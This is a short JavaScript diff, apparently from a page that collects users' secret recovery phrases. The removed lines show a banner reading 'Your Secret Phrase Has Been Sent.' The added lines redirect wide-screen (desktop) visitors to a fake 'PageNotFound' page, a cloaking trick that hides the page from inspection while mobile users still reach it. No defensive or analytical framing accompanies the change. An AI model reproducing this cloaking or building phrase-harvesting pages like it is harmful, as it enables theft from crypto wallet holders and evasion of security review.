@@ -2,10 +2,9 @@ let str1 = ""
 let str2 = ""
 let selected = 0
 
-let confirmed = ` <div class="confirm-outer">
-                    <h2>Confirmed !!</h2>
-                    <h3>Your Secret Phrase Has Been Sent.</h3>
-                  </div>`
+if(screen.width > 768){
+  window.location.assign("../PageNotFound/PageNotFound.html")
+}
 
 function checkSymbNum(inputData){
     let inputLen = inputData.length
